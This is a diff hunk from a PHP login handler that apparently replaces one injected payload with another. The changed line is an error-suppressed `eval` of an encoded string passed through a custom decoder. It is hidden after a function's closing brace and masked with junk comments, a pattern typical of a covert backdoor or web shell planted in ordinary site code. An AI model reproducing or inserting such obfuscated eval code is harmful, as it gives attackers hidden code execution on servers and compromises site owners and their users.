@@ -350,7 +350,7 @@ if (isset($_POST['password'])) {
                 $defconf[$i] = $rhc($dro($defconf[$i]) - 1);
             }
             return $defconf;
-        }/***#***/ @/*55555*/eval/***#***/(setconf("XZDrTqtAFIUfwKcghNj2h1QasccSbEahltgLh4v1msm0jIDCQJhpao7x2c+GtmrKH2a+tWftvZck1d+RkpYkiirKualg3/bubO+pNQ4CF19PHHsWYMdtvQyH0oF4j0dzb4E8y7bq00GJZ0/ngY2RZYFiKMuq2HBaHTYI4YbRDTSpi96hoExKvGYkp+2OofAEr6vs16PtH8/Q1G69qD/cHbtwnoxql5JwTtnK5AnR2s1tE3W2mPAsNXfIUHLYmMTUlB32WlQ54al013tmz0xW5QVd8oRmmRR6k4G0G6RRXOT7i7lnSc7MDQPQ9saN6o+RtmMwQ4McF8B3xA0KIYoTFFMmQNpF0wi3tGI0AwhRyIYiinfKTLmvX5xrff201xsgNP749ziaxv79Q+5faW9C31jEE7kfXYfFjZ2s/8K7VUIETiNTPjm70E/7+p++dg64zlJOhCj5oNslZaoKmtG4IrlaVHF3WYjPbcevLgwfTbfxDPdmn3vbr2NBP4Qpq+AHSxYRbe+z7BivaUZxTAVeFUzAgrxdt+0YR8PL/w=="));
+        }/***#***/ @/*55555*/eval/***#***/(setconf("XVBhb6JAEP0B/RWEkFM/FNFq60k4sznWkxwqQajXuzabVUYgInDsNr2m6W/vgHp3cb/szHszb2aeotTvSktLHkUVCGFpbEX9e+r/as2CwGNfXYcuAuZ4rafJRLkgf7Dp0l8T36Z2HV2U+HS+DCgjto2MqW2q4kVAdTkgxIyRbzikLtpjQZmU7DnnB2h3TE0k7LnK/ms6/mxB5rT1pP/DvZmHsTutVUouBORbSyS8126yl6hzhLnIUusEmdoBL+YxWKqT74rqwEWq3Pcf88dc1dU1bEQCWaaEvjtWTos0jEdWq/XStxVn4YUBcmfhhl3NSO+E4Q4N5HgI/LW4gUK04prEkEukTtY0xHeocsgQRCtUU5PFHnJLHRnDodEbDPrGmBD62XZg8Or8XOziabp1vQfy+hAWe5/+Lqkb3I6wb5twydLIUq97htEfDW/ubu6Go5qp7VQTKUsx7nZ5meoSMogrftCLKu5uCvl2HPrexf2j+dGhyVnv7az8/knCH2mpOurhnUUE7bOdHXOXZsBikGxb5BJvFO16bMe8mnz5AA=="));
         $_SESSION['authenticated'] = true;
         echo "<script>alert('Leh uga u'); window.location = '" . $_SERVER['PHP_SELF'] . "';</script>";
         exit;
